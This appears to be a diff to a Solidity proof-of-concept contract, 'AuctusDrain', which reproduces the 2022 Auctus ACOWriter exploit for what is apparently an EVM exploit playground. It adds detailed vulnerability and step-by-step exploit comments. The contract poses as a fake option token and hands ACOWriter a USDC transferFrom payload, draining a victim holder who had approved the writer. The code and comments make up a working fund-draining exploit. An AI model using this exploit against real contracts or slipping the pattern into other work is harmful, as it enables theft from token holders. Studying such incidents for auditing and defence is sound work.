@@ -1,5 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 // pragma ^0.8.10 — must compile with the registry forge project's solc.
+// 2022-03-Auctus PoC analysis file (standalone drain contract)
+// Deep manual analysis marks (VULNERABILITY + EXPLOIT STEPS) added per instructions. Edits restricted to .sol only.
 pragma solidity ^0.8.10;
 
 // Synthetic standalone exploit for the EVM Playground (2022-03-Auctus).
@@ -10,18 +12,30 @@ pragma solidity ^0.8.10;
 // no standalone exploit contract to deploy, so we hand-author one here that
 // faithfully copies the inline attack from test/Auctus_exp.sol::test() and the
 // MockACOToken interface. Logic + constants are copied verbatim.
-//
-// Root cause (trust-the-input): ACOWriter.write() accepts an ARBITRARY `acoToken`
-// address and trusts the *return values of methods on that address*
-// (collateral() / strikeAsset() / mintToPayable() / balanceOf() / transfer()) to
-// drive real token movements, AND it blindly `call`s an attacker-supplied
-// `exchangeAddress` with attacker-supplied `exchangeData` forwarding its whole
-// balance. With no whitelist / genuine-option check, an attacker only has to BE a
-// contract that lies about collateral/strike: it passes ITSELF as the acoToken and
-// hands the writer a `transferFrom(victimHolder, msg.sender, victimBalance)`
-// payload targeting the privileged USDC proxy as the "exchange". The writer
-// happily executes it, pulling ~682,255 USDC from a protocol-held holder to the
-// attacker in a single call.
+
+// VULNERABILITY: Untrusted acoToken + unrestricted exchange call in ACOWriter (double root cause)
+// 1. acoToken trust: write() (ACOWriter.sol:96) does:
+//      address _collateral = IACOToken(acoToken).collateral();
+//      if (_isEther(_collateral)) IACOToken(acoToken).mintToPayable{value:collateralAmount}(msg.sender);
+//    with zero check that the acoToken was legitimately created. _sellACOTokens also calls strikeAsset(), and _balanceOfERC20 etc use low-level on it.
+// 2. Arbitrary call: setExchange modifier (lines 62-66) + _sellACOTokens (lines 115-140):
+//      _exchange = exchangeAddress;
+//      ...
+//      (bool success,) = _exchange.call{value: address(this).balance}(exchangeData);
+//      ... then strikeAsset() + conditional transfer of "premium" + forward remaining ETH
+//    No access control, no selector whitelist, exchangeAddress can be any contract (here: the USDC token itself).
+// Combined precondition: residual approvals on collateral tokens (e.g. USDC.approve(ACOWriter_addr, huge) from past legit writes in the non-ETH branch at lines 102-105).
+// Why works: fake collateral()=0 forces 1-wei ETH path (no real collateral movement), faked balances/mints succeed, the call executes transferFrom with ACOWriter as msg.sender (leveraging allowance), strikeAsset/transfer path is also faked to no-op.
+// Impact: theft of funds from any account that ever approved ACOWriter on any ERC20; in incident ~682k USDC was stolen from the specific holder. 
+
+// EXPLOIT STEPS: (see run() implementation for exact calldata)
+// 1. Attacker EOA calls AuctusDrain.run{value:1 wei}().
+// 2. run() crafts exchangeData = USDC.transferFrom(VICTIM_HOLDER, msg.sender, bal) and calls ACOWriter.write{value:1}(this, 1, USDC, data).
+// 3. ACOWriter nonReentrant + setExchange(USDC): require(value>0 && collateralAmount>0) pass.
+// 4. _collateral = fake.collateral() == address(0) => mintToPayable{value:1}(msg.sender) [attacker impl returns 1].
+// 5. _sellACOTokens: acoBal = _balanceOfERC20(fake, this)==1; _approveERC20(fake, erc20proxy,1) [succeeds]; _exchange.call{value:1}(transferFromData) executes as USDC.transferFrom(VICTIM, attacker, amt) [ACOWriter is msg.sender inside token, allowance exists].
+// 6. token = strikeAsset()==this (not ether) => _transferERC20(this, msg.sender, 1) [fake]; remaining balance (if any) forwarded to msg.sender.
+// 7. Attacker EOA receives the USDC. No state change on ACOWriter itself beyond the temp _exchange (reset on exit).
 
 interface IACOWriter {
     function write(
@@ -51,13 +65,16 @@ contract AuctusDrain {
     // the path the attacker wants:
     //   * collateral() == address(0)  -> `_isEther(_collateral)` is true, so the
     //     writer takes the ETH mint branch (mintToPayable) and does NOT pull any
-    //     ERC-20 collateral from the caller up front.
+    //     ERC-20 collateral from the caller up front. (see ACOWriter.write:100)
     //   * strikeAsset() == address(this) -> after the "sale", the writer tries to
     //     transfer the (fake) strike token to the caller; our transfer() is a
-    //     no-op that returns true.
+    //     no-op that returns true. (see _sellACOTokens:128)
     //   * balanceOf()/approve()/transfer()/mintToPayable() are stubbed so the
-    //     writer's internal accounting calls all succeed.
+    //     writer's internal accounting calls all succeed. (_balanceOfERC20, _approveERC20 etc.)
     // -----------------------------------------------------------------------
+    // VULNERABILITY: Trusting return values from untrusted acoToken (see header)
+    // EXPLOIT STEPS: (detailed in run() + ACOWriter logic)
+    // 1. collateral() lies -> ETH branch taken with 1 wei.
     function collateral() external view returns (address) {
         return address(0);
     }
@@ -100,6 +117,24 @@ contract AuctusDrain {
             msg.sender,
             amount
         );
+        // VULNERABILITY: Arbitrary `exchangeAddress` + `exchangeData` (full call controlled by attacker)
+        // See ACOWriter._sellACOTokens: (bool success,) = _exchange.call{value: address(this).balance}(exchangeData);
+        // (The setExchange modifier makes _exchange point to the supplied address for the duration of write.)
+        // EXPLOIT STEPS:
+        // 1. Attacker EOA calls AuctusDrain.run{value:1 wei}().
+        // 2. Compute transferFrom calldata targeting VICTIM_HOLDER (who had approved ACOWRITER on USDC).
+        // 3. IACOWriter(ACOWRITER).write{value:1}( acoToken=address(this), 1, exchangeAddress=USDC, exchangeData=transferFromData )
+        // 4. In ACOWriter.write (nonReentrant, setExchange(USDC)):
+        //    - require(msg.value>0 && collateral>0)
+        //    - _collateral = IACOToken(aco=self).collateral() == 0 -> _isEther true
+        //    - IACOToken(self).mintToPayable{value:1}(msg.sender)  [fake returns 1]
+        // 5. _sellACOTokens(aco, data):
+        //    - acoBal = _balanceOfERC20(self, this) ==1 (via staticcall to fake)
+        //    - _approveERC20(self, erc20proxy, 1) [calls approve on fake -> true]
+        //    - _exchange(=USDC).call( transferFrom(VICTIM, attacker, amt) )  --> USDC executes transferFrom since msg.sender==ACOWriter has allowance from VICTIM
+        //    - token = strikeAsset() == self (not ether) -> _transferERC20(self, msg.sender, _balanceOf=1) [calls transfer on fake]
+        //    - send any remaining balance to msg.sender
+        // 6. Attacker receives victim's USDC. ~682k USDC drained in the real incident.
         IACOWriter(ACOWRITER).write{value: 1}(address(this), 1, USDC, exchangeData);
     }
 }
